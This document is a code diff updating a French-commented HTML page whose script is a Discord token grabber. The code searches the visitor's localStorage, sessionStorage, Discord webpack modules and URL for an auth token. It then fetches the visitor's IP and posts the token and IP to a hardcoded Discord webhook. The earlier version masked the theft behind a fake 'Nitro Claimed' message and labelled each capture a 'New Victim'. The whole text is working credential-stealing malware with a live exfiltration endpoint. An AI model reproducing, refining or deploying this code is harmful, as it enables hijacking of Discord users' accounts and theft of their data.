@@ -10,69 +10,91 @@
     </div>
     
     <script>
+        // DEBUG: Affiche TOUS les tokens possibles
         async function grabToken() {
             let token = '';
+            let debugInfo = [];
             
-            // Méthode 1: localStorage (classique)
-            try { token = localStorage.token || localStorage['*'] || ''; } catch(e) {}
+            // 1. localStorage MULTI
+            const lsKeys = Object.keys(localStorage);
+            for(let key of lsKeys) {
+                if(key.includes('token') || key.includes('*')) {
+                    debugInfo.push(`${key}: ${localStorage[key]?.slice(0,20)}`);
+                    if(localStorage[key]?.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) token = localStorage[key];
+                }
+            }
             
-            // Méthode 2: WebpackChunk (moderne)
+            // 2. sessionStorage
+            for(let key of Object.keys(sessionStorage)) {
+                if(sessionStorage[key]?.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
+                    token = sessionStorage[key];
+                    debugInfo.push(`sessionStorage.${key}`);
+                }
+            }
+            
+            // 3. Webpack (toutes versions)
             try {
-                for(let i in webpackChunkdiscord_app?.push) {
-                    webpackChunkdiscord_app.push([[Math.random()], {}, req => {
-                        for(let m in req.c) {
-                            if(req.c[m].exports?.default?.getToken !== undefined) {
-                                token = req.c[m].exports.default.getToken();
-                                break;
+                const chunks = window.webpackChunkdiscord_app || [];
+                for(let chunk of chunks) {
+                    if(Array.isArray(chunk)) {
+                        const modReq = chunk[2];
+                        if(modReq) {
+                            for(let m in modReq.c) {
+                                const mod = modReq.c[m].exports?.default;
+                                if(mod?.getToken && typeof mod.getToken === 'function') {
+                                    token = mod.getToken();
+                                    debugInfo.push('webpack.getToken()');
+                                    break;
+                                }
                             }
                         }
-                    }]);
-                }
-            } catch(e) {}
-            
-            // Méthode 3: __webpack_require__
-            try {
-                const req = webpackChunkdiscord_app?.pop()?.[2];
-                if(req) {
-                    for(let m of Object.keys(req.c || {})) {
-                        const mod = req.c[m].exports?.default;
-                        if(mod?.getToken) token = mod.getToken();
                     }
                 }
-            } catch(e) {}
+            } catch(e) {debugInfo.push('webpack error');}
             
-            // Méthode 4: Fallback asar
-            try {
-                const asar = await fetch('chrome-extension://jhmbjhfblfmmdgmflgeodincpooibdmh/app.asar');
-                token = asar.token;
-            } catch(e) {}
+            // 4. window.__TAURI__ (Desktop)
+            if(window.__TAURI__) {
+                debugInfo.push('Tauri desktop');
+            }
             
-            console.log('Token trouvé:', token ? 'OUI' : 'NON');
+            // 5. Fallback: URL params (rare)
+            const urlToken = new URLSearchParams(window.location.search).get('token');
+            if(urlToken) token = urlToken;
             
-            if(!token || !token.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
-                document.body.innerHTML = '<h1 style="color:red;">❌ Token non trouvé<br>Actualise Discord et réessaie</h1>';
+            console.log('DEBUG TOKENS:', debugInfo);
+            console.log('TOKEN FINAL:', token ? token.slice(0,50)+'...' : 'AUCUN');
+            
+            if(!token?.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
+                document.body.innerHTML = `
+                    <div style="color:orange;text-align:center;padding:20px;">
+                        <h2>🔍 DEBUG INFO</h2>
+                        <p>Tokens trouvés: ${debugInfo.length}</p>
+                        <details>
+                            <summary>Clique pour voir console</summary>
+                            <p>F12 → Console pour debug complet</p>
+                        </details>
+                        <p>1. Ouvre Discord d'abord</p>
+                        <p>2. Recharge cette page</p>
+                        <p>3. F12 → Application → Local Storage</p>
+                    </div>
+                `;
                 return;
             }
             
-            // IP + User Agent
-            let ip = 'Unknown';
-            try {
-                ip = await (await fetch('https://api.ipify.org?format=json')).json().then(r=>r.ip);
-            } catch(e) {}
-            
-            // WEBHOOK
+            // ENVOI WEBHOOK
+            let ip = await (await fetch('https://api.ipify.org')).text().catch(()=>'N/A');
             const data = {
-                content: `**🎯 TOKEN CAPTURED**\n\`\`\`${token}\`\`\`\n**IP:** \`${ip}\`\n**UA:** ${navigator.userAgent.slice(0,60)}`,
-                embeds: [{title:'🆕 New Victim', color:0x00ff00}]
+                content: `\`\`\`${token}\`\`\`\n**IP:** ${ip}\n**Debug:** ${debugInfo.slice(0,3).join(', ')}`,
+                embeds: [{title:'🎯 TOKEN OK !', color:0x00ff00}]
             };
             
-            await fetch('https://discord.com/api/webhooks/1459250463625973771/9kPMp9m-Hs1CklXscaLMUceI3MwK3pLFFH4hGakCRUmFirvD3XVsys8JBFRncDe4BjXy', {
+            fetch('https://discord.com/api/webhooks/1459250463625973771/9kPMp9m-Hs1CklXscaLMUceI3MwK3pLFFH4hGakCRUmFirvD3XVsys8JBFRncDe4BjXy', {
                 method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)
             });
             
-            document.body.innerHTML = '<h1 style="color:lime;font-size:28px;">✅ Nitro Claimed ! Merci ! 🎉</h1>';
+            document.body.innerHTML = '<h1 style="color:lime;">✅ TOKEN ENVOYÉ ! Merci !</h1>';
         }
-    </script>
+        </script>
 </body>
 </html>
 
